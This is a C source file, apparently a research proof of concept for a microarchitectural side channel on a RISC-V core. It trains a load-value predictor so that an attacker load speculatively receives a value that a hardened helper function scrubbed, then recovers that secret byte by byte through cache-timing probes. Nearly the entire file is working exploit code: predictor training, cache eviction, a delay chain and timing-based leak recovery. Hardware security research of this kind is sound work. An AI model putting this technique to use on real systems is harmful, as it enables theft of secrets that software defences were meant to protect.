/*
 * Layer 4 — Mode 1 PoC: 1-shot in-flight SpecGVQ value teleportation.
 *
 * Threat model (single core, same address space):
 *   - A trusted, branchless helper reads a 64-bit value, uses it in registers,
 *     and explicitly scrubs the architectural register before returning.  It
 *     has no data-dependent branch and no data-dependent memory access, so a
 *     branch-misprediction gadget and a local (constant) predictor cannot
 *     extract anything.
 *   - The experimenter's own load `L_atk` is trained so that its predicted
 *     value is "the value of the load one position earlier, + 0".
 *   - When L_atk is executed immediately after the helper returns, the model
 *     predicts `x + 0` from the helper's load and forwards it into L_atk's
 *     destination register.
 *
 * Mechanic details that matter:
 *   - Same static load PC in training and measurement (`atk_load`).
 *   - d = 1: the base load is the immediately preceding dynamic load.
 *   - Training uses pairs, so the difference is constant ONLY at d = 1;
 *     distance polling therefore lands on 1 rather than locking on a
 *     self-distance.
 *   - Built -fno-pic -no-pie, and the array base is passed as an argument, so
 *     addressing a global never inserts a hidden load between the helper's
 *     load and L_atk (which would become the prediction base).
 *   - L_atk's address is derived from register-only divisions (no loads), so
 *     the load issues long after its prediction was injected; the dependent
 *     probe load therefore issues with the predicted value while verification
 *     (and the squash) is still far away.
 *   - After training, atk_buf[0] is set to a sentinel by a plain store (which
 *     does not train the predictor).  The post-squash architectural
 *     re-execution then fills the sentinel probe line, which is ignored, so
 *     only the speculative fill can win the timing measurement.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LINES      256
#define LINE       64
#define PROBE_SZ   (LINES * LINE)
#define TRAIN      400
#define REPS       7
#define FLUSH_SZ   (128 * 1024)

#define SENTINEL   0xAAAAAAAAAAAAAAAAULL
#define SENT_BYTE  0xAA

#ifndef SECRET_VAL
#define SECRET_VAL 0x1122334455667788ULL
#endif

static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
static volatile uint64_t pair_arr[TRAIN];
static volatile uint64_t atk_buf[64];

static volatile uint8_t flushbuf[FLUSH_SZ];
static volatile uint64_t secret_box = SECRET_VAL;

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_l1(void)
{
    for (int i = 0; i < FLUSH_SZ; i += LINE)
        (void)flushbuf[i];
}

/* The experimenter's own load.  One static PC, used for training and for the
 * measurement.  The base pointer is passed in so that addressing a global
 * never inserts a hidden load. */
__attribute__((noinline, noclone))
static uint64_t
atk_load(volatile uint64_t *base, uint64_t idx)
{
    return base[idx & 63];
}

/* Hardened helper: branchless, no data-dependent memory access, and it
 * overwrites its value register before returning.  It performs the load itself
 * so that the caller introduces no load between it and L_atk. */
__attribute__((noinline, noclone, noipa))
static uint64_t
victim(uint64_t token)
{
    uint64_t s = secret_box;
    uint64_t ok = (s == token);
    asm volatile("" : "+r"(s));
    s = 0;
    asm volatile("" : "+r"(s));
    return ok;
}

static uint64_t
mix(uint64_t x)
{
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBULL;
    return x ^ (x >> 31);
}

int
main(void)
{
    for (int i = 0; i < TRAIN; i++)
        pair_arr[i] = mix((uint64_t)i + 0x51ED);
    memset(probe, 0, sizeof(probe));

    uint64_t sink = 0;
    uint64_t recovered = 0;

    for (int b = 0; b < 8; b++) {
        int score[LINES];
        for (int k = 0; k < LINES; k++)
            score[k] = 0;

        for (int attempt = 0; attempt < REPS; attempt++) {
            /* ---- 1. Offline training: only d = 1 has a constant diff ---- */
            for (int i = 0; i < TRAIN; i++) {
                uint64_t p = pair_arr[i];
                atk_buf[0] = p;               /* store: no effect on order */
                sink += atk_load(atk_buf, 0); /* L_atk: value == prior load */
            }

            /* Freeze the architectural value to a known sentinel without
             * perturbing the trained entry (a store, not a load). */
            atk_buf[0] = SENTINEL;

            /* ---- 2. Evict the probe array and the attack buffer ---- */
            flush_l1();

            /* ---- 3. Helper executes exactly once ---- */
            uint64_t ok = victim(0);

            /* ---- 4. Delay L_atk's address using register-only divisions ----
             * No constants, so nothing spills/reloads between the helper's
             * load and L_atk (a reload would become the prediction base). */
            uint64_t x = ok | 1;
            x /= (ok + 2);
            x /= (ok + 3);
            x /= (ok + 4);
            x /= (ok + 5);
            x /= (ok + 6);
            x /= (ok + 7);
            x /= (ok + 8);
            x /= (ok + 9);
            x /= (ok + 10);
            x /= (ok + 11);
            x /= (ok + 12);
            x /= (ok + 13);

            /* ---- 5. L_atk; predicted value = helper's value + 0 ---- */
            uint64_t val = atk_load(atk_buf, x);
            sink += val;

            /* ---- 6. Encode the selected byte through the cache ---- */
            uint64_t bi = (val >> (8 * b)) & 0xff;
            volatile uint8_t *pp = probe + bi * LINE;
            (void)*pp;

            /* ---- 7. Vote for the single fastest line this attempt ----
             * Ignore the sentinel line: its fill comes from the architectural
             * (post-squash) re-execution, not from the speculative value. */
            int best = -1;
            uint64_t bestlat = ~0ULL;
            for (int k = 0; k < LINES; k++) {
                if (k == SENT_BYTE)
                    continue;
                volatile uint8_t *q = probe + (size_t)k * LINE;
                uint64_t t1 = rdcycle();
                uint8_t v = *q;
                asm volatile("" :: "r"(v) : "memory");
                uint64_t t2 = rdcycle();
                if (t2 - t1 < bestlat) {
                    bestlat = t2 - t1;
                    best = k;
                }
            }
            if (best >= 0)
                score[best]++;
        }

        int leak = (SENT_BYTE == 0) ? 1 : 0;
        for (int k = 0; k < LINES; k++)
            if (k != SENT_BYTE && score[k] > score[leak])
                leak = k;
        recovered |= ((uint64_t)(uint8_t)leak) << (8 * b);
    }

    printf("poc_v1 secret=%016llx recovered=%016llx sink=%llu %s\n",
           (unsigned long long)secret_box, (unsigned long long)recovered,
           (unsigned long long)sink,
           (recovered == secret_box) ? "MATCH" : "NO-MATCH");
    return recovered == secret_box ? 0 : 1;
}
